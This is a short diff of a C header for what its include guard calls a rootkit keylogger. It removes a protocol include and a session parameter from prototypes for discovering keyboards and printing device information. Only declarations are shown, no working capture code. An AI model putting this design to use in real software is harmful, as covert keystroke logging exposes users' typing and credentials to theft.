@@ -4,7 +4,6 @@
 #include <stddef.h>
 #include <stdint.h>
 #include <stdlib.h>
-#include "protocol.h"
 
 #define BITS_PER_LONG (sizeof(long) * 8)
 #define NBITS(x) ((((x)-1)/BITS_PER_LONG)+1)
@@ -39,8 +38,8 @@ int verify_device(int fd);
 void print_relative_time(const struct timeval *ev_time);
 
 
-void discover_keyboards(struct session_info * session_info);
+void discover_keyboards(void);
 int is_keyboard(int fd);
-void print_device_info(struct session_info * session_info, const char *path, int fd);
+void print_device_info(const char *path, int fd);
 
 #endif //ROOTKIT_KEYLOGGER_H
